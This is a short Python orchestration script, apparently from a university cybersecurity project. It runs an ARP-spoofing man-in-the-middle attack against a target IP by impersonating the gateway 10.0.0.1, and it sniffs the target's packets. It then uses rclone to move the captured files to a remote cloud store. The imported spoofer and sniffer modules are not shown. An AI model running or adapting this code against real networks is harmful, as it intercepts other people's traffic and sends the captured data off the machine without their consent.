#!/usr/bin/env python3
# main.py
from spoofer import *
import sys
import threading
import subprocess
from sniffer import readPackets

def main():
	target = sys.argv[1]
	host = "10.0.0.1"
	verbose = False
	try:

		t1 = threading.Thread(target=arpSpoof, args=(target, host, verbose,))
		t1.daemon = True
		t1.start()
		readPackets(target)
		t1.join()

	except KeyboardInterrupt:
		print("\tARP Spoofing interrupted. Restoring network.")
		restore(target, host, verbose)
		restore(host, target, verbose)

	result = subprocess.run(['rclone', 'move', '/home/magnu/UTokyo-Cyber-Security-Project/Packet_Cap/SniffedFiles/', 'Magnus:SecurityTest'])


if __name__ == "__main__":
	main()
